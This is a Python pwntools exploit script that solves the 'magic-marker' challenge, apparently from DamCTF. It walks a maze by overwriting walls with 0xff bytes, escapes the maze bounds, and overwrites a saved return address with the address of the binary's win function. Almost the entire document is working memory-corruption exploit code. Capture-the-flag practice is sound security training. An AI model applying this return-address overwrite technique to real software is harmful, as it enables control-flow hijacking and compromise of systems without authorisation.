#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote('chals.damctf.xyz', 31313, *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())

def findPos(maze):
	y= 0
	for i in range(1, len(maze), 2): # 81
		y += 1
		x = 0
		for j in range(0, len(maze[0]) -1, 4): # 161
			x += 1
			if('*' in maze[i][j: j+4]):
				return x, y

exe = './magic-marker'
elf = context.binary = ELF(exe, checksec=False)
# warning/info/debug
context.log_level = 'info'

io = start()

io.sendlineafter(b'like to do?\n', b'jump up and down')
io.sendlineafter(b': ', b'm')
s = io.recvuntil(b'This r')[:-7].decode().split('\n')
x, y = findPos(s)
print(x, y)

# kick down the walls and get to the lower right
for i in range(40 - x):
	io.sendlineafter(b': ', b'x')
	io.sendlineafter(b'to write?\n', b'\xff'*32)
	io.sendlineafter(b': ', b'd')
for j in range(40 - y):
	io.sendlineafter(b': ', b'x')
	io.sendlineafter(b'to write?\n', b'\xff'*32)
	io.sendlineafter(b': ', b's')

# lets bust out of here, return to the east
io.sendlineafter(b'): ', b'x')
io.sendlineafter(b'?\n', 0x20 * b'\xff')
io.sendlineafter(b'): ', b'd')
io.sendlineafter(b'): ', b'd')
io.sendlineafter(b'): ', b'x')
io.sendlineafter(b'?\n', 0x20 * b'\xff')
io.sendlineafter(b'): ', b'd')
io.sendlineafter(b'): ', b'x')


# 8 bytes before the return address FTW!
io.sendlineafter(b'?\n', p64(0) + p64(elf.sym.win))
io.sendlineafter(b'): ', b'q')
io.stream()